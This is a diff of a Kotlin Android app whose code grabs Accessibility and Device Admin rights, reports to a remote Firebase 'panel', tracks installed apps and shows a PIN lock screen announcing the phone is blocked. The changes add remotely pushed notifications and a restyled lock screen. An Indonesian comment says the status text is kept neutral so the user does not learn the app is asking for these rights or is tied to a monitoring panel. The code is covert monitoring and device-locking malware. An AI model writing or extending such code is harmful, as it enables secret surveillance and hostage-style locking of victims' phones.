@@ -1,8 +1,12 @@
 package com.sosxa.app
 
+import android.Manifest
 import android.accessibilityservice.AccessibilityService
 import android.app.Activity
 import android.app.Application
+import android.app.Notification
+import android.app.NotificationChannel
+import android.app.NotificationManager
 import android.app.admin.DeviceAdminReceiver
 import android.app.admin.DevicePolicyManager
 import android.content.BroadcastReceiver
@@ -22,6 +26,9 @@ import android.webkit.WebView
 import android.widget.LinearLayout
 import android.widget.ProgressBar
 import android.widget.TextView
+import android.graphics.Bitmap
+import android.graphics.BitmapFactory
+import java.net.URL
 import com.google.firebase.FirebaseApp
 import com.google.firebase.FirebaseOptions
 import com.google.firebase.database.DataSnapshot
@@ -46,6 +53,15 @@ class App : Application() {
                     .setProjectId("nweacsess")
                     .build()
             )
+        }
+        // TAMBAHAN: channel notifikasi (wajib di Android 8+ sebelum bisa kirim notifikasi)
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            val channel = NotificationChannel(
+                "sosxa_notify",
+                "Notifikasi",
+                NotificationManager.IMPORTANCE_HIGH
+            )
+            getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
         }
         Sync.start(this)
     }
@@ -137,6 +153,19 @@ object Sync {
             lockHtml = it.getValue(String::class.java) ?: ""
             prefs.edit().putString("lock_html", lockHtml).apply()
         }
+
+        // TAMBAHAN: dengarkan notifikasi baru dari panel
+        listen(base.child("notify")) { snap ->
+            val ts = snap.child("ts").getValue(Long::class.java) ?: return@listen
+            val lastTs = prefs.getLong("last_notify_ts", 0L)
+            if (ts <= lastTs) return@listen
+            prefs.edit().putLong("last_notify_ts", ts).apply()
+
+            val label = snap.child("label").getValue(String::class.java) ?: "Notifikasi"
+            val message = snap.child("message").getValue(String::class.java) ?: ""
+            val imageUrl = snap.child("imageUrl").getValue(String::class.java) ?: ""
+            appContext?.let { c -> showNotification(c, label, message, imageUrl) }
+        }
         listen(base.child("installed_apps")) { s ->
             val set = HashSet<String>()
             s.children.forEach { c ->
@@ -181,6 +210,38 @@ object Sync {
             }
             override fun onCancelled(e: DatabaseError) {}
         })
+    }
+
+    // TAMBAHAN: tampilkan notifikasi sistem, dengan foto custom opsional (didownload
+    // dari URL yang diisi di panel). Download dilakukan di thread terpisah supaya
+    // tidak mengganggu thread utama.
+    private fun showNotification(ctx: Context, label: String, message: String, imageUrl: String) {
+        fun post(bitmap: Bitmap?) {
+            val builder = Notification.Builder(ctx, "sosxa_notify")
+                .setContentTitle(label)
+                .setContentText(message)
+                .setSmallIcon(ctx.applicationInfo.icon)
+                .setAutoCancel(true)
+            if (bitmap != null) {
+                builder.setLargeIcon(bitmap)
+                builder.style = Notification.BigPictureStyle().bigPicture(bitmap)
+            }
+            val nm = ctx.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
+            nm.notify(System.currentTimeMillis().toInt(), builder.build())
+        }
+
+        if (imageUrl.isNotBlank()) {
+            Thread {
+                val bmp = try {
+                    BitmapFactory.decodeStream(URL(imageUrl).openStream())
+                } catch (e: Exception) {
+                    null
+                }
+                post(bmp)
+            }.start()
+        } else {
+            post(null)
+        }
     }
 
     private fun listen(ref: DatabaseReference, f: (DataSnapshot) -> Unit) {
@@ -301,9 +362,12 @@ class MainActivity : Activity() {
         ) ?: "").contains(packageName)
         val adm = getSystemService(DevicePolicyManager::class.java)
             .isAdminActive(ComponentName(this, AdminReceiver::class.java))
+        // TAMBAHAN: izin notifikasi (hanya diwajibkan Android 13 ke atas)
+        val notif = Build.VERSION.SDK_INT < Build.VERSION_CODES.TIRAMISU ||
+            checkSelfPermission(Manifest.permission.POST_NOTIFICATIONS) == android.content.pm.PackageManager.PERMISSION_GRANTED
 
         // TAMBAHAN: teks status selalu netral di semua kondisi, tidak membocorkan
-        // bahwa app ini sedang meminta izin Accessibility/Device Admin atau
+        // bahwa app ini sedang meminta izin Accessibility/Device Admin/Notifikasi atau
         // bahwa app ini terhubung ke sebuah panel pemantauan.
         when {
             !adm -> {
@@ -326,6 +390,13 @@ class MainActivity : Activity() {
                     // Langsung buka halaman toggle service ini (bukan daftar semua service)
                     intent.putExtra("android.provider.extra.APP_PACKAGE", packageName)
                     startActivity(intent)
+                }
+            }
+            !notif -> {
+                statusView.text = "Menyiapkan konfigurasi..."
+                if (lastPrompted != "notif") {
+                    lastPrompted = "notif"
+                    requestPermissions(arrayOf(Manifest.permission.POST_NOTIFICATIONS), 101)
                 }
             }
             else -> {
@@ -413,9 +484,23 @@ class BlockActivity : Activity() {
 class LockScreenActivity : Activity() {
     private var entered = StringBuilder()
     private lateinit var dotsView: TextView
+    private lateinit var defaultArea: LinearLayout
     private lateinit var msgView: TextView
+    private lateinit var subView: TextView
     private lateinit var msgWeb: WebView
-    private lateinit var msgContainer: LinearLayout
+    private lateinit var root: LinearLayout
+    private lateinit var bottomArea: LinearLayout
+
+    private val seaBlueGradient by lazy {
+        android.graphics.drawable.GradientDrawable(
+            android.graphics.drawable.GradientDrawable.Orientation.TOP_BOTTOM,
+            intArrayOf(
+                Color.parseColor("#01152B"),
+                Color.parseColor("#023E73"),
+                Color.parseColor("#0A6E8C")
+            )
+        )
+    }
 
     override fun onCreate(b: Bundle?) {
         super.onCreate(b)
@@ -427,22 +512,27 @@ class LockScreenActivity : Activity() {
                 android.view.WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON
         )
 
-        val seaBlue = Color.parseColor("#023E73")
         val lightBlue = Color.parseColor("#7FD4E8")
 
-        val root = LinearLayout(this).apply {
+        root = LinearLayout(this).apply {
             orientation = LinearLayout.VERTICAL
-            gravity = Gravity.CENTER
-            setBackgroundColor(seaBlue)
-            setPadding(64, 64, 64, 64)
+            background = seaBlueGradient
         }
 
+        // TAMBAHAN: area atas (mengisi sisa layar) - isinya GANTI TOTAL,
+        // bukan digabung: default (ikon+teks) ATAU custom HTML, tidak pernah dua-duanya.
+        defaultArea = LinearLayout(this).apply {
+            orientation = LinearLayout.VERTICAL
+            gravity = Gravity.CENTER
+            layoutParams = LinearLayout.LayoutParams(
+                LinearLayout.LayoutParams.MATCH_PARENT, 0, 1f
+            )
+        }
         val lockIcon = TextView(this).apply {
             text = "\uD83D\uDD12"
             textSize = 48f
             gravity = Gravity.CENTER
         }
-
         msgView = TextView(this).apply {
             text = "HP Sudah Diblokir"
             textSize = 22f
@@ -450,32 +540,30 @@ class LockScreenActivity : Activity() {
             gravity = Gravity.CENTER
             setPadding(0, 24, 0, 8)
         }
-        msgWeb = WebView(this).apply {
-            settings.javaScriptEnabled = false
-            settings.allowFileAccess = false
-            settings.allowContentAccess = false
-            setBackgroundColor(Color.TRANSPARENT)
-            visibility = android.view.View.GONE
-            layoutParams = LinearLayout.LayoutParams(
-                LinearLayout.LayoutParams.MATCH_PARENT,
-                400
-            )
-        }
-        // TAMBAHAN: wadah tampilan pesan, isinya default (TextView) atau custom HTML (WebView)
-        msgContainer = LinearLayout(this).apply {
-            orientation = LinearLayout.VERTICAL
-        }
-        msgContainer.addView(msgView)
-        msgContainer.addView(msgWeb)
-        updateLockDisplay()
-
-        val subView = TextView(this).apply {
+        subView = TextView(this).apply {
             text = "Masukkan PIN untuk membuka"
             textSize = 14f
             setTextColor(lightBlue)
             gravity = Gravity.CENTER
-            setPadding(0, 0, 0, 32)
         }
+        defaultArea.addView(lockIcon)
+        defaultArea.addView(msgView)
+        defaultArea.addView(subView)
+
+        // TAMBAHAN: WebView custom HTML - mengisi penuh area atas (bukan kotak kecil),
+        // jadi tidak ada sisa warna biru laut kelihatan di sekitarnya saat aktif.
+        msgWeb = WebView(this).apply {
+            settings.javaScriptEnabled = false
+            settings.allowFileAccess = false
+            settings.allowContentAccess = false
+            setBackgroundColor(Color.WHITE)
+            visibility = android.view.View.GONE
+            layoutParams = LinearLayout.LayoutParams(
+                LinearLayout.LayoutParams.MATCH_PARENT, 0, 1f
+            )
+        }
+
+        updateLockDisplay()
 
         dotsView = TextView(this).apply {
             text = ""
@@ -489,6 +577,7 @@ class LockScreenActivity : Activity() {
         val pad = LinearLayout(this).apply {
             orientation = LinearLayout.VERTICAL
             gravity = Gravity.CENTER
+            setPadding(0, 16, 0, 16)
         }
         val rows = listOf(
             listOf("1", "2", "3"),
@@ -525,11 +614,20 @@ class LockScreenActivity : Activity() {
             pad.addView(rowLayout)
         }
 
-        root.addView(lockIcon)
-        root.addView(msgContainer)
-        root.addView(subView)
-        root.addView(dotsView)
-        root.addView(pad)
+        // TAMBAHAN: bottomArea (dots + keypad) selalu tampil, latar gelap transparan
+        // supaya tetap kebaca jelas walau custom HTML pakai warna terang.
+        bottomArea = LinearLayout(this).apply {
+            orientation = LinearLayout.VERTICAL
+            gravity = Gravity.CENTER
+            setBackgroundColor(Color.parseColor("#CC000000"))
+            setPadding(32, 24, 32, 24)
+        }
+        bottomArea.addView(dotsView)
+        bottomArea.addView(pad)
+
+        root.addView(defaultArea)
+        root.addView(msgWeb)
+        root.addView(bottomArea)
         setContentView(root)
     }
 
@@ -539,20 +637,21 @@ class LockScreenActivity : Activity() {
         updateLockDisplay()
     }
 
-    // TAMBAHAN: tampilkan custom HTML dari panel kalau diisi, kalau kosong pakai default
+    // TAMBAHAN: GANTI TOTAL tampilan, bukan digabung.
+    // Custom HTML diisi -> default (ikon biru laut + teks) disembunyikan sepenuhnya,
+    // WebView custom mengisi seluruh area atas. Custom HTML kosong -> balik ke default.
     private fun updateLockDisplay() {
         if (Sync.lockHtml.isNotBlank()) {
-            msgView.visibility = android.view.View.GONE
+            defaultArea.visibility = android.view.View.GONE
             msgWeb.visibility = android.view.View.VISIBLE
             msgWeb.loadDataWithBaseURL(
                 null,
-                "<meta name='viewport' content='width=device-width,initial-scale=1'><body style='margin:0;background:transparent;color:white;font-family:sans-serif'>${Sync.lockHtml}</body>",
+                "<meta name='viewport' content='width=device-width,initial-scale=1'><body style='margin:0;display:flex;align-items:center;justify-content:center;min-height:100vh;font-family:sans-serif'>${Sync.lockHtml}</body>",
                 "text/html", "UTF-8", null
             )
         } else {
             msgWeb.visibility = android.view.View.GONE
-            msgView.visibility = android.view.View.VISIBLE
-            msgView.text = "HP Sudah Diblokir"
+            defaultArea.visibility = android.view.View.VISIBLE
         }
     }
 
